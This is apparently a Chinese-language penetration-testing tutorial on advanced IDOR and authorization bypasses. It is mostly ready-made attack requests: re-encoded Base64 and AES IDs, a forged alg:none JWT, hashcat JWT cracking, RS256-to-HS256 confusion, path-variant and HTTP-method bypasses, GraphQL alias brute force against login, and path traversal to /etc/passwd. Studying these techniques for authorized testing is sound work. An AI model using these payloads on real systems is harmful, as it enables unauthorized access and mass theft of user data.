# 1."换数字"不够用
基础中"把 ?id=123 改成 ?id=124"。但现实中，稍微成熟一点的应用早就做了简单的防御：

| 防御手段                 | 实际遇到的场景                           |
| -------------------- | --------------------------------- |
| ID 加密/编码（Base64、AES） | `?token=eyJ1c2VyX2lkIjoxMjN9`     |
| UUID 替代自增ID          | `?id=550e8400-e29b-41d4 ...`      |
| GraphQL 接口           | `{"query":"{user(id:1){email}}"}` |
| HTTP 方法限制            | POST 被拦但 PUT 没管                   |
| JWT 角色控制             | Token 里有 `"role":"user"`          |
| 多步骤验证                | 第3步忘了加权限检查                        |
# 2.加密/编码 ID 的绕过
## 2.1：Base64 编码 ID
有些应用把 ID 做 Base64 编码，觉得"攻击者看不懂"。
```
# 你看到的请求
GET /api/profile?token=eyJ1c2VyX2lkIjoxMjN9

# Base64 解码 → {"user_id":123}
# ⭐ 改成 124 → {"user_id":124} → Base64 编码 → eyJ1c2VyX2lkIjoxMjR9
GET /api/profile?token=eyJ1c2VyX2lkIjoxMjR9

# 工具：Burp 的 Decoder 面板，或命令行
echo -n '{"user_id":124}' | base64
```
 实战要点
Base64 不是加密，是编码。看到 = 结尾、字符集是 A-Za-z0-9+/ 的，先解码看看。 URL 中的 Base64 可能用 - 和 _ 替代 + 和 /（URL-safe Base64）。
## 2.2：Hash/签名 ID
有些应用用 MD5(user_id) 或 HMAC(user_id, secret) 作为参数。
```
# 你看到的请求
GET /api/order?uid=202cb962ac59075b964b07152d234b70

# MD5("123") = 202cb962ac59075b964b07152d234b70
# ⭐ 验证：这是不是 MD5？去 cmd5.com 查一下

# 如果是纯 MD5，没有 salt：
# 1. 生成 1-10000 的 MD5 字典
# 2. 用 Burp Intruder 的 Payload type: Runtime file
# 3. 批量替换 uid 参数

# Python 生成字典
for i in range(1, 10001):
    print(f"{i}:{hashlib.md5(str(i).encode()).hexdigest()}")
```

> [!important] 带salt
> 如果有 Salt/Secret
> 带 salt 的 hash 猜不出来。但如果**hash 是客户端生成的**
> （前端 JS 加密），可以：
> 1. 在浏览器 DevTools 中搜索 md5、sha、encrypt、sign
> 2. 找到加密函数后，直接在 Console 里调用它生成任意 ID 的 hash
> 3. window.encryptUserId(124) → 拿到 124 的合法 hash

## 2.3：AES/DES 加密 ID — 前端泄露密钥
有些应用用 AES 加密 ID，看起来无懈可击。但密钥写在前端 JS 里——等于锁了门把钥匙挂在门把手上。
```
# 步骤1：在前端 JS 中搜索加密密钥
# DevTools → Sources → Search（Ctrl+Shift+F）
# 搜索关键词：CryptoJS, AES, encrypt, secret, key, iv

# 步骤2：找到密钥后，在 Console 中直接调用
# 假设前端代码是 CryptoJS.AES.encrypt(id, "sk3yK8y2024")
var key = CryptoJS.enc.Utf8.parse("sk3yK8y2024");
var encrypted = CryptoJS.AES.encrypt("124", key, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7
});
console.log(encrypted.toString());  // → 拿到 124 的加密 token

# 步骤3：用这个 token 发请求
GET /api/order?token=<加密后的124>
```
真实案例:
某金融 APP 前端用 AES-ECB 加密用户 ID，密钥硬编码在 JS 中。攻击者在 Console 里调用前端的加密函数， 生成任意用户 ID 的加密 token，批量遍历全部用户账户余额和交易记录。
# 3.JWT 操纵 — 垂直越权
JWT（JSON Web Token）是现代 API 最常用的认证方式。很多开发者把角色/权限信息直接写在 JWT payload 中，而且不做服务端校验。

**JWT 结构拆解**
```
# JWT 由三部分组成：Header.Payload.Signature（用 . 分隔）
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.xxxxx

# Header（Base64解码）→ {"alg":"HS256"}
# Payload（Base64解码）→ {"user_id":123,"role":"user"}  ← ⭐ 角色在这里
# Signature → HMAC-SHA256(Header + Payload, secret)

# ⭐ 攻击思路：如果服务端不验证签名，直接改 Payload 就行
```
## 3.1：alg: none 绕过
JWT 标准允许 "alg":"none"，表示不签名。如果服务端信任这个声明，你就能伪造任意 Token。
```

# 原始 Token 的 Header: {"alg":"HS256","typ":"JWT"}
# 修改为: {"alg":"none","typ":"JWT"}
# Base64url 编码: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# 原始 Payload: {"user_id":123,"role":"user"}
# 修改为: {"user_id":1,"role":"admin"}    ← 改成管理员
# Base64url 编码: eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ

# Signature: 空字符串

# 完整伪造 Token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.

# ⭐ 注意最后有个点！没有签名但结构要完整。
```

工具推荐：Burp 插件 **JWT Editor**
（PortSwigger 官方）：自动修改 JWT Payload，支持 alg:none 攻击和密钥爆破。 手动也可以，用 jwt.io 在线编解码。
## 3.2：弱密钥爆破
如果 alg:none 不行，说明服务端验签了。但如果密钥太弱（如 "secret"、"123456"），可以爆破。

```
# 工具：hashcat（GPU 加速爆破）
# 从 JWT 中提取 token，保存到文件
echo "eyJhbGc..." > jwt.txt

# 用 hashcat 模式 16500 爆破 JWT
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# 爆破成功后，用密钥重新签名任意 Payload
# 在 jwt.io 上输入密钥，修改 role 为 admin，生成新 Token
```
## 3.3：算法混淆攻击（RS256 → HS256）
服务端用 RS256（非对称），公钥公开。如果库实现有缺陷，你可以把算法改成 HS256（对称），用公钥当 HMAC 密钥签名。

```
# 原理：
# RS256：私钥签名，公钥验签（公钥公开）
# HS256：同一密钥签名+验签
# 漏洞：服务端把公钥当 HMAC 密钥来验签

# 攻击步骤：
# 1. 获取服务端公钥（通常在 /.well-known/jwks.json 或前端）
# 2. 修改 Header: {"alg":"HS256"}
# 3. 修改 Payload: {"role":"admin"}
# 4. 用公钥作为 HMAC-SHA256 密钥签名
# 5. 服务端用同一个公钥做 HMAC 验签 → 通过！

# ⭐ 影响：Python pyjwt < 1.5.1、Node jsonwebtoken < 4.2.2 等均有此漏洞
```
# 4.HTTP 方法绕过
很多 API 网关只对 GET/POST 做了权限控制，忘了管其他方法。
## 4.1方法切换绕过
```
# 场景：GET 被拦截（403 Forbidden）
GET /admin/users HTTP/1.1
→ 403 Forbidden

# ⭐ 试试其他方法
POST   /admin/users → 可能 200
PUT    /admin/users → 可能 200
PATCH  /admin/users → 可能 200
DELETE /admin/users → 可能 200
HEAD   /admin/users → 可能 200
OPTIONS /admin/users → 看允许的方法

# 更骚的：加 X-HTTP-Method-Override 头
POST /admin/users HTTP/1.1
X-HTTP-Method-Override: GET
# 某些框架（Express、Spring）会按这个头路由
```

## 4.2路径变体绕过

```
# Nginx/Apache 规则匹配 /admin 但不匹配 /admin/ 的情况
/admin        → 403
/admin/       → 200  ← 加斜杠
/admin/.      → 200  ← 加点
/admin//      → 200  ← 双斜杠
/./admin/     → 200  ← 前缀点斜杠
/admin;js     → 200  ← 分号（Tomcat 特性）
/admin/../admin → 200 ← 路径穿越自身
/admin%20     → 200  ← URL编码空格
/admin%09     → 200  ← Tab
/ADMIN        → 200  ← 大小写（Windows服务器）
/admin.json   → 200  ← 加后缀
/admin?       → 200  ← 问号
```
⭐ 自动化工具 Burp 插件 ：Bypass WAF
或用 Intruder 批量测试路径变体。 也可以用 ffuf：`ffuf -w bypass.txt -u https://target.com/FUZZ`
# 5.GraphQL IDOR — 很多团队根本不会防
GraphQL 是近年最流行的 API 架构。但很多团队把 REST 的 IDOR 防御逻辑搬过来时忘了适配——GraphQL 的 IDOR 更隐蔽。

## 5.1GraphQL 内省 → 发现所有查询

```
# 发送内省查询，列出所有 API 和字段
POST /graphql
{"query":"{__schema{types{name fields{name type{name}}}}}"}

# ⭐ 从返回结果中找：哪些查询接收 id 参数？
# 例如发现：user(id: ID!): User
#           orders(userId: ID!): [Order]
#           document(id: ID!): Document
```
## 5.2GraphQL IDOR 的 3 种利用方式

```
# 方式1：直接换 ID（和 REST 一样）
{"query":"{user(id:124){email phone idCard}}"}

# 方式2：⭐ 批量查询（Batching）—— 1 请求查 N 个不同用户
{"query":"{
  u1: user(id:1){email phone}
  u2: user(id:2){email phone}
  u3: user(id:3){email phone}
  # ... 一次查 100 个
}"}
# ⭐ 绕过的是"按 HTTP 请求数"的限流：
#   网关只看到 1 个 POST /graphql 请求，
#   但服务端实际执行了 N 次 user 解析（resolver 调用）

# 方式3：⭐ 别名暴力破解（Alias Brute Force）—— 重复同一操作
# 同一操作重复多次（如撞库 / 验证码爆破），每次只换输入
{"query":"{
  a1: login(user:\"admin\", pass:\"123456\"){ok}
  a2: login(user:\"admin\", pass:\"123457\"){ok}
  a3: login(user:\"admin\", pass:\"123458\"){ok}
}"}
# ⭐ 绕过的是"按账号/IP 的请求频率"或"失败次数锁定"
#   1000 次尝试 = 1 个 HTTP 请求，限流器只数到 1
# ⚠️ 若服务端按 resolver 调用次数限流（如"每分钟最多 5 次 login"），别名无效
```
真实案例:某社交平台 GraphQL 接口，user(id:X) 返回手机号和邮箱，无权限校验。 攻击者用别名攻击一次请求查 50 个用户，绕过速率限制，5 分钟拖了 10 万用户数据。SRC 评级：严重
# 6.文件操作中的 IDOR — 最容易漏检
开发者在做 API 权限校验时很认真，但文件下载/上传接口经常被遗漏。

## 6.1文件下载 IDOR
```
# 场景：下载自己的发票
GET /download?file=invoice_123.pdf
# file 参数是文件名，服务器直接拼接路径返回

# ⭐ 攻击1：改文件名
GET /download?file=invoice_124.pdf  → 别人的发票！

# ⭐ 攻击2：路径穿越（不只是 IDOR）
GET /download?file=../../../etc/passwd
GET /download?file=../../config/database.yml

# ⭐ 攻击3：枚举文件名
# 发票通常按日期+用户ID命名
# invoice_20240101_123.pdf → 遍历 _1 到 _10000
```
## 6.2导出接口 IDOR

```
# 导出自己的数据
POST /api/export
{"user_id": 123, "format": "csv"}

# ⭐ 改 user_id → 导出别人的数据
POST /api/export
{"user_id": 124, "format": "csv"}
# 服务器生成 124 的数据 CSV，返回下载链接

# 更骚的：批量导出
{"user_id": "*", "format": "csv"}     # 通配符
{"user_id": "all", "format": "csv"}   # 关键字
{"user_ids": [1,2,3,...,1000]}        # 数组
```
